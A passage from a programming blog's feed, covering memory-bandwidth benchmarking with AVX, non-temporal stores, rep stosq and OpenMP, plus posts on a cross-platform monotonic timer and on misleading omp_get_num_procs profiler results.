  &lt;span class="n"&gt;__m256i&lt;/span&gt; &lt;span class="n"&gt;vals&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;_mm256_set1_epi32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__m256i&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;_mm256_store_si256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;varray&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;vals&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  &lt;span class="c1"&gt;// This will generate the vmovaps instruction.&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;But when I use use this, I didn't get any better bandwidth than before!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./memory_profiler
&lt;span class="go"&gt;                write_memory_avx:  9.01 GiB/s&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Why was I consistently getting slightly under half the theoretical memory bandwidth?&lt;/p&gt;
&lt;p&gt;The answer is a bit complicated because the cache in a modern processor is &lt;a href="http://15418.courses.cs.cmu.edu/15418_spr13/index.php/lecture/cachecoherence1/slide_028"&gt;complicated&lt;/a&gt;&lt;sup id="fnref-5"&gt;&lt;a class="footnote-ref" href="#fn-5"&gt;6&lt;/a&gt;&lt;/sup&gt;. The main problem is that memory traffic on the bus is done in units of &lt;em&gt;cache lines&lt;/em&gt;, which tend to be larger than 32 bytes. In order to write only 32 bytes, the cache must first &lt;em&gt;read&lt;/em&gt; the entire cache line from memory and then modify it. Unfortunately, this means that my program, which only writes values, will actually cause double the memory traffic I expect because it will cause reads of cache line! As you can see from the picture below, the bus traffic (the blue lines out of the processor) per cache line is a read and a write to memory:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Cache traffic for a partial cache line write" src="https://codearcana.com/images/cache_readwrite.png" title="Cache traffic for a partial cache line write"&gt;&lt;/p&gt;
&lt;h1&gt;Non-temporal instructions&lt;/h1&gt;
&lt;p&gt;So how do I solve this problem? The answer lies in a little known feature: non-temporal instructions. As described in Ulrich Drepper's 100 page &lt;a href="http://www.akkadia.org/drepper/cpumemory.pdf"&gt;&lt;em&gt;What every programmer should know about memory&lt;/em&gt;&lt;/a&gt;,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;These non-temporal write operations do not read a cache line and then modify it; instead, the new content is directly written to memory. This might sound expensive but it does not have to be. The processor will try to use write-combining (see section 3.3.3) to ﬁll entire cache lines. If this succeeds no memory read operation is needed at all.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Aha! I can use these to avoid the reads and get our full bandwidth!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;write_memory_nontemporal_avx&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;__m256i&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;varray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__m256i&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;__m256i&lt;/span&gt; &lt;span class="n"&gt;vals&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;_mm256_set1_epi32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__m256&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;_mm256_stream_si256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;varray&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;vals&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  &lt;span class="c1"&gt;// This generates the vmovntps instruction.&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I run our new program and am disappointed again:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./memory_profiler
&lt;span class="go"&gt;    write_memory_nontemporal_avx: 12.65 GiB/s&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;At this point I'm getting really frustrated. Am I on the right track? I quickly compare our benchmarks to &lt;code&gt;memset&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./memory_profiler
&lt;span class="go"&gt;             write_memory_memset: 12.84 GiB/s&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;and see that while I am far from the theoretical bandwidth, I'm at least on the same scale as &lt;code&gt;memset&lt;/code&gt;. So now the question is: is it even &lt;em&gt;possible&lt;/em&gt; to get the full bandwidth?&lt;/p&gt;
&lt;h1&gt;Repeated string instructions&lt;/h1&gt;
&lt;p&gt;At this point, I got some advice: Dillon Sharlet had a key suggestion here to use the repeated string instructions. The &lt;a href="http://web.itu.edu.tr/kesgin/mul06/intel/instr/rep.html"&gt;&lt;code&gt;rep&lt;/code&gt;&lt;/a&gt; instruction prefix repeats a special string instruction. For example, &lt;code&gt;rep stosq&lt;/code&gt; will repeatedly store a word into an array - exactly what I want. For relatively recent processors&lt;sup id="fnref-7"&gt;&lt;a class="footnote-ref" href="#fn-7"&gt;7&lt;/a&gt;&lt;/sup&gt;, this works well. After looking up the hideous syntax for inline assembly&lt;sup id="fnref-8"&gt;&lt;a class="footnote-ref" href="#fn-8"&gt;8&lt;/a&gt;&lt;/sup&gt;, I get our function:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;write_memory_rep_stosq&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;asm&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;cld&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
      &lt;span class="s"&gt;&amp;quot;rep stosq&amp;quot;&lt;/span&gt;
      &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;D&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;c&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;a&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And when I run, I get results that are really close to the peak bandwidth:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./memory_profiler
&lt;span class="go"&gt;          write_memory_rep_stosq: 20.60 GiB/s&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now the plot thickens. It turns out that it is &lt;em&gt;indeed&lt;/em&gt; possible to get the full memory bandwidth, but I can't get close with my non-temporal AVX instructions. So what is up?&lt;/p&gt;
&lt;h1&gt;Multiple cores&lt;/h1&gt;
&lt;p&gt;Again, Dillon Sharlet provided an important insight: the goal of saturating the entire bandwidth with a single core was perhaps a bit extreme. In order to use the full bandwidth, I would need to use multiple cores. I used OpenMP to run the function over multiple cores. To avoid counting the OpenMP overhead, I computed the timings only after all threads are ready and after all threads are done. To do this, I put barriers before the timing code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#pragma omp parallel  &lt;/span&gt;&lt;span class="c1"&gt;// Set OMP_NUM_THREADS to the number of physical cores.&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="cp"&gt;#pragma omp barrier  &lt;/span&gt;&lt;span class="c1"&gt;// Wait for all threads to be ready before starting the timer.&lt;/span&gt;

&lt;span class="cp"&gt;#pragma omp master  &lt;/span&gt;&lt;span class="c1"&gt;// Start the timer on only one thread.&lt;/span&gt;
&lt;span class="n"&gt;start_time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;monotonic_seconds&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

&lt;span class="c1"&gt;// The code we want to time.&lt;/span&gt;

&lt;span class="cp"&gt;#pragma omp barrier  &lt;/span&gt;&lt;span class="c1"&gt;// Wait for all threads to finish before ending the timer.&lt;/span&gt;

&lt;span class="cp"&gt;#pragma omp master  &lt;/span&gt;&lt;span class="c1"&gt;// End the timer.&lt;/span&gt;
&lt;span class="n"&gt;end_time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;monotonic_seconds&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When I run, I get very reasonable output (remember, the goal is 23.8 GiB/s):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;OMP_NUM_THREADS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt; ./memory_profiler  &lt;span class="c1"&gt;# I only have 4 physical cores.&lt;/span&gt;
&lt;span class="go"&gt;            write_memory_avx_omp:  9.68 GiB/s&lt;/span&gt;
&lt;span class="go"&gt;write_memory_nontemporal_avx_omp: 22.15 GiB/s&lt;/span&gt;
&lt;span class="go"&gt;         write_memory_memset_omp: 22.15 GiB/s&lt;/span&gt;
&lt;span class="go"&gt;      write_memory_rep_stosq_omp: 21.24 GiB/s&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Final thoughts&lt;/h1&gt;
&lt;p&gt;Finally! We are within 10% of our theoretically maximum bandwidth. I'm tempted to try to squeeze out some more bandwidth, but I suspect there isn't much more that I can do. I think any more performance would probably require booting the machine into a special configuration (hyper threading and frequency scaling disabled, etc) which would not be representative of real programs.&lt;/p&gt;
&lt;p&gt;I still have some unanswered questions (I will happily buy a beer for anyone who can give a compelling answer):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Why doesn't &lt;code&gt;write_memory_avx_omp&lt;/code&gt;, the function that uses AVX to store (but doesn't use non-temporal instructions) use half the bandwidth?&lt;/li&gt;
&lt;li&gt;Why doesn't the use of non-temporal instructions double bandwidth for the single core programs? It only went up 50%.&lt;/li&gt;
&lt;li&gt;Why aren't the AVX instructions on one core able to saturate the bandwidth ?&lt;/li&gt;
&lt;li&gt;Why don't AVX instructions get roughly double the bandwidth of the SSE instructions?&lt;/li&gt;
&lt;li&gt;Why doesn't &lt;code&gt;rep scansq&lt;/code&gt; or &lt;code&gt;rep lodsq&lt;/code&gt; get the same bandwidth as &lt;code&gt;rep stosq&lt;/code&gt;?&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="footnote"&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id="fn-1"&gt;
&lt;p&gt;&lt;a href="http://15418.courses.cs.cmu.edu/15418_spr13/index.php/lecture/basicarch/slide_039"&gt;This lecture&lt;/a&gt; from the course is very good at illustrating some of these concepts.&amp;#160;&lt;a class="footnote-backref" href="#fnref-1" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-4"&gt;
&lt;p&gt;I'm not completely convinced this math is correct, but this number lines up with &lt;a href="http://ark.intel.com/products/64891/Intel-Core-i7-3720QM-Processor-6M-Cache-up-to-3_60-GHz"&gt;the specs provided by Intel&lt;/a&gt; for my processor as well.&amp;#160;&lt;a class="footnote-backref" href="#fnref-4" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-2"&gt;
&lt;p&gt;It should be too large to fit in cache since I want to test memory throughput, not cache throughput.&amp;#160;&lt;a class="footnote-backref" href="#fnref-2" title="Jump back to footnote 3 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-3"&gt;
&lt;p&gt;Use a &lt;a href="https://codearcana.com/posts/2013/05/15/a-cross-platform-monotonic-timer.html"&gt;monotonic timer&lt;/a&gt; to avoid errors caused by the system clock.&amp;#160;&lt;a class="footnote-backref" href="#fnref-3" title="Jump back to footnote 4 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-6"&gt;
&lt;p&gt;For future work, I'll probably write a kernel module in the style of &lt;a href="http://download.intel.com/embedded/software/IA/324264.pdf"&gt;this excellent Intel white paper&lt;/a&gt;.&amp;#160;&lt;a class="footnote-backref" href="#fnref-6" title="Jump back to footnote 5 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-5"&gt;
&lt;p&gt;Ok, the answer is actually fairly complicated and I'm going to lie just a little bit to simplify things. If you're curious how a modern cache works, you should read through the &lt;a href="http://15418.courses.cs.cmu.edu/15418_spr13/index.php/lecture/cachecoherence1"&gt;lectures&lt;/a&gt; on it.&amp;#160;&lt;a class="footnote-backref" href="#fnref-5" title="Jump back to footnote 6 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-7"&gt;
&lt;p&gt;Apparently, this wasn't always the case: &lt;a href="http://stackoverflow.com/a/8429084/447288"&gt;http://stackoverflow.com/a/8429084/447288&lt;/a&gt;. In addition, my benchmarking seems to indicate that neither &lt;code&gt;rep lodsq&lt;/code&gt; or &lt;code&gt;rep scansq&lt;/code&gt; benefit from the same degree of optimization that &lt;code&gt;rep stosq&lt;/code&gt; received. I don't fully understand what all is going on.&amp;#160;&lt;a class="footnote-backref" href="#fnref-7" title="Jump back to footnote 7 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-8"&gt;
&lt;p&gt;The inline assembly wasn't strictly necessary here (I could have and should have written it directly in an assembly file), but I've had difficulties exporting function names in assembly portably.&amp;#160;&lt;a class="footnote-backref" href="#fnref-8" title="Jump back to footnote 8 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</content><category term="profiling"></category></entry><entry><title>A cross-platform monotonic timer</title><link href="https://codearcana.com/posts/2013/05/15/a-cross-platform-monotonic-timer.html" rel="alternate"></link><published>2013-05-15T00:00:00-07:00</published><updated>2013-05-15T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-15:/posts/2013/05/15/a-cross-platform-monotonic-timer.html</id><summary type="html">&lt;p&gt;I've been working on writing a memory bandwidth benchmark for a while and needed to use a monotonic timer to compute accurate timings. I have since learned that this is more challenging to do that I initially expected and each platform has a different way of doing it.&lt;/p&gt;</summary><content type="html">&lt;p&gt;I've been working on writing a memory bandwidth benchmark for a while and
needed to use a monotonic timer to compute accurate timings. I have since
learned that this is more challenging to do that I initially expected and each
platform has a different way of doing it.&lt;/p&gt;
&lt;h1&gt;The problem&lt;/h1&gt;
&lt;p&gt;I was trying to determine the run time of a function and wanted the most
precise and accurate information possible.
First, I started by using &lt;code&gt;gettimeofday&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;timeval&lt;/span&gt; &lt;span class="n"&gt;before&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;after&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="n"&gt;gettimeofday&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;before&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;function&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="n"&gt;gettimeofday&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;after&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Unfortunately, this will not always work since it is dependent on the system clock. If some other process changes the system time between the two calls to &lt;code&gt;gettimeofday&lt;/code&gt;, it could report inaccurate results. We need a function that returns a monotonically increasing value.&lt;/p&gt;
&lt;h1&gt;A solution?&lt;/h1&gt;
&lt;p&gt;Luckily, such a function exists on Linux. We can use &lt;code&gt;clock_gettime&lt;/code&gt; with &lt;code&gt;CLOCK_MONOTONIC&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;timespec&lt;/span&gt; &lt;span class="n"&gt;before&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;after&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="n"&gt;clock_gettime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CLOCK_MONOTONIC&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;before&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;function&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="n"&gt;clock_gettime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CLOCK_MONOTONIC&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;after&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Other platforms&lt;/h1&gt;
&lt;p&gt;Unfortunately, this doesn't work everywhere! Each platform has its own way
accessing a high resolution monotonic counter. On Mac OS X we use
&lt;a href="https://developer.apple.com/library/mac/#qa/qa1398/_index.html"&gt;&lt;code&gt;mach_absolute_time&lt;/code&gt;&lt;/a&gt;
and on Windows we use
&lt;a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms644904(v=vs.85).aspx"&gt;&lt;code&gt;QueryPerformanceCounter&lt;/code&gt;&lt;/a&gt;. &lt;/p&gt;
&lt;h2&gt;&lt;code&gt;rdtsc&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;On x86 machines where none of these are available, we can resort directly to &lt;code&gt;rdtsc&lt;/code&gt;. This is a special instruction that returns the &lt;a href="https://en.wikipedia.org/wiki/Time_Stamp_Counter"&gt;Time Stamp Counter&lt;/a&gt;, the number of cycles since reset. Unfortunately, we have to be &lt;em&gt;very&lt;/em&gt; careful when using this instruction. &lt;a href="http://download.intel.com/embedded/software/IA/324264.pdf"&gt;This white paper&lt;/a&gt; offers a lot of good advice on how to use it, but in short we have to take care to prevent instruction reordering. In the following code, the reordering of the &lt;code&gt;fdiv&lt;/code&gt; after the &lt;code&gt;rdtsc&lt;/code&gt; would lead to inaccurate timing results:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;rdtsc&lt;/span&gt;
&lt;span class="nf"&gt;fdiv&lt;/span&gt; &lt;span class="c"&gt;# Or another slow instruction&lt;/span&gt;
&lt;span class="nf"&gt;rdtsc&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The instruction &lt;code&gt;rdtscp&lt;/code&gt; prevents instructions that occur before the &lt;code&gt;rdtsc&lt;/code&gt; from being reordered afterwards. Unfortunately, instructions that occur after the &lt;code&gt;rdtscp&lt;/code&gt; can still be reordered before it. The following code could have &lt;code&gt;fdiv&lt;/code&gt; reordered before the &lt;code&gt;rdtscp&lt;/code&gt;, leading to inaccurate results:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;rdtscp&lt;/span&gt;
&lt;span class="nf"&gt;call&lt;/span&gt; &lt;span class="no"&gt;function&lt;/span&gt;
&lt;span class="nf"&gt;rdtscp&lt;/span&gt;
&lt;span class="nf"&gt;fdiv&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The suggested way to avoid the reordering is to use the &lt;code&gt;cpuid&lt;/code&gt; instruction, which has the effect of preventing all instruction reordering around it. While this is a slow instruction, we can be a bit clever and ensure that we never have to execute it while between the times when we query the counter.&lt;br&gt;
The ideal timing code looks something like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;cpuid&lt;/span&gt;
&lt;span class="nf"&gt;rtdsc&lt;/span&gt;
&lt;span class="c"&gt;# Save %edx and %eax (the output of rtdsc).&lt;/span&gt;
&lt;span class="nf"&gt;call&lt;/span&gt; &lt;span class="no"&gt;function&lt;/span&gt;
&lt;span class="nf"&gt;rdtscp&lt;/span&gt;
&lt;span class="c"&gt;# Save %edx and %eax.&lt;/span&gt;
&lt;span class="nf"&gt;cpuid&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;A cross platform timer&lt;/h1&gt;
&lt;p&gt;Assembling all this information, I attempted to write a cross-platform utility for fine grained timing. A few late nights and a file full of &lt;code&gt;#ifdef&lt;/code&gt;s later, I have the start of such a utility. Currently, it supports the function &lt;code&gt;monotonic_seconds&lt;/code&gt; which returns the seconds from some unspecified start point as a double precision floating point number. In the future, I'll add support for &lt;code&gt;monotonic_cycles&lt;/code&gt; as a static inline function in the header and &lt;code&gt;cycles_to_seconds&lt;/code&gt; as a way to convert cycles to seconds. Check it out &lt;a href="https://github.com/awreece/monotonic_timer/blob/master/monotonic_timer.c"&gt;here&lt;/a&gt;!&lt;/p&gt;</content><category term="profiling"></category></entry><entry><title>Why is omp_get_num_procs so slow?</title><link href="https://codearcana.com/posts/2013/05/10/why-is-omp_get_num_procs-so-slow.html" rel="alternate"></link><published>2013-05-10T00:00:00-07:00</published><updated>2013-05-10T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-10:/posts/2013/05/10/why-is-omp_get_num_procs-so-slow.html</id><summary type="html">&lt;p&gt;Some students had some difficulty profiling their code because &lt;code&gt;omp_get_num_procs&lt;/code&gt; was dominating the profiling traces. I tracked it down and found that the profiling tools emitted misleading results when the library didn't have symbols.&lt;/p&gt;</summary><content type="html">&lt;p&gt;I was advising some students in
&lt;a href="http://15418.courses.cs.cmu.edu/15418_spr13/"&gt;15-418&lt;/a&gt;, a parallel computer
architecture and programming course at CMU. They were attempting to make a
multithreaded puzzle solver using OpenMP and had some difficulty using the CPU
profiler from &lt;a href="https://code.google.com/p/gperftools/"&gt;Google &lt;code&gt;perftools&lt;/code&gt;&lt;/a&gt;.
Basically, the profiler kept reporting that &lt;code&gt;omp_get_num_procs&lt;/code&gt; was taking a
huge portion of the program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt;  pprof --text solver out.prof 
&lt;span class="go"&gt;Using local file solver.&lt;/span&gt;
&lt;span class="go"&gt;Using local file out.prof.&lt;/span&gt;
&lt;span class="go"&gt;Removing _L_unlock_16 from all stack traces.&lt;/span&gt;
&lt;span class="go"&gt;Total: 1382 samples&lt;/span&gt;
&lt;span class="go"&gt;     633  45.8%  45.8%      633  45.8% omp_get_num_procs&lt;/span&gt;
&lt;span class="go"&gt;     283  20.5%  66.3%      283  20.5% is_complete_row&lt;/span&gt;
&lt;span class="go"&gt;     226  16.4%  82.6%      226  16.4% partial_check_col&lt;/span&gt;
&lt;span class="go"&gt;     102   7.4%  90.0%      744  53.8% backtrack_row_solve&lt;/span&gt;
&lt;span class="go"&gt;      42   3.0%  93.1%       85   6.2% partial_check_row&lt;/span&gt;
&lt;span class="go"&gt;      41   3.0%  96.0%      351  25.4% partial_check&lt;/span&gt;
&lt;span class="go"&gt;      26   1.9%  97.9%      292  21.1% complete_and_check_puzzle&lt;/span&gt;
